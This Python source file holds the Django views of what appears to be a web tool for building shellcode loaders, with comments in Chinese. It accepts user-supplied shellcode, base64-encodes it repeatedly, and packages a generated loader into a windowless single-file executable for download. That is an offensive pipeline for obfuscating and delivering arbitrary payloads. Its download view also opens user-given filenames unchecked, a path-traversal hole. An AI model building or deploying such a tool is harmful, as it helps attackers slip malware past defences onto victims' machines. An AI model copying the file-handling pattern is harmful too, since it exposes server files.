from django.shortcuts import render, redirect
from django.core.paginator import Paginator, EmptyPage
from django.contrib import messages
from shellcode.models import Shellcode
from datetime import datetime
from shellcode.shellcode import creat_loader
from django.conf import settings
from django.http import FileResponse, Http404
from pathlib import Path
import shutil
import uuid
import base64
import os
import platform

# Create your views here.


def index(request):
    shellcode_list = Shellcode.objects.all()

    '''
    数据通常是从 models 中获取。这里为了方便，直接使用生成器来获取数据。
    '''

    # 分页器
    paginator = Paginator(shellcode_list, 6)

    current_page_num = int(request.GET.get('page', 1))

    if paginator.num_pages > 11:
        if current_page_num - 5 < 1:
            page_range = range(1, 11)
        elif current_page_num + 5 > paginator.num_pages:
            page_range = range(paginator.num_pages - 10, paginator.num_pages + 1)  # range顾头不顾尾
        else:
            page_range = range(current_page_num - 5, current_page_num + 6)

    else:
        page_range = paginator.page_range
    try:

        current_page = paginator.page(current_page_num)

    except EmptyPage as e:
        current_page = paginator.page(1)

    return render(request, 'index.html', locals())


# 接收请求数据
def create_loader(request):
    if request.POST:
        shellcode = request.POST['shellCode'].encode()
        number = request.POST['number']
        packaging = request.POST['packaging']

        for i in range(int(number)):
            shellcode = base64.b64encode(shellcode)

        shellcode = str(shellcode)[2:-1]
        hash_md5 = str(uuid.uuid1())     # 基于时间戳
        pub_date = datetime.now()

        sysstr = platform.system()
        if sysstr == "Windows":
            filename = hash_md5 + '.exe'
        else:
            filename = hash_md5

        codeinfo = {
            'hash_md5': hash_md5,
            'shellcode': shellcode,
            'pub_date': pub_date,
            'number': number,
            'packaging': packaging,
            'filename': filename
        }
        print(codeinfo)
        Shellcode.objects.create(**codeinfo)

        # 生成最后打包的py文件
        creat_loader(number, hash_md5)
        path = settings.MEDIA_ROOT + '/' + hash_md5
        try:
            if packaging == 'Pyinstaller':
                os.system('pyinstaller --noconsole --clean --distpath {} --onefile {} --specpath {} --specpath {}'.format(settings.MEDIA_ROOT, path + '.py', settings.MEDIA_ROOT, settings.MEDIA_ROOT))
                # 删除 生成的多余文件
                path = os.path.join(Path(__file__).resolve().parent.parent, 'build')
                shutil.rmtree(path)
                path = os.path.join(Path(__file__).resolve().parent.parent, 'download/' + hash_md5 + '.spec')
                os.remove(path)
        except Exception as e:
            print(e)

    messages.success(request, "Loader生成成功，请稍等一会下载使用")
    return redirect("/",)


def get_code(request):
    hash_uuid = request.GET['uuid']
    shellcode = Shellcode.objects.get(hash_md5=hash_uuid)
    shellcode = shellcode.shellcode
    return render(request, 'shellcode.html', {'shellcode': shellcode})


# 文件下载
def file_down(request):
    try:
        filename = request.GET['filename']
        path = open(settings.MEDIA_ROOT + '/' + filename, 'rb')
        response = FileResponse(path)
        response['Content-Type'] = 'application/octet-stream'
        response['Content-Disposition'] = 'attachment;filename="{}"'.format(filename)
        return response

    except Exception as e:
        print(e)
        raise Http404


# 删除
def delete_shellcode(request):
    try:
        hash_uuid = request.GET['uuid']
        shellcode = Shellcode.objects.get(hash_md5=hash_uuid)
        shellcode.delete()
        messages.success(request, "删除成功")
    except Exception as e:
        print(e)
        raise Http404
    return redirect("/",)


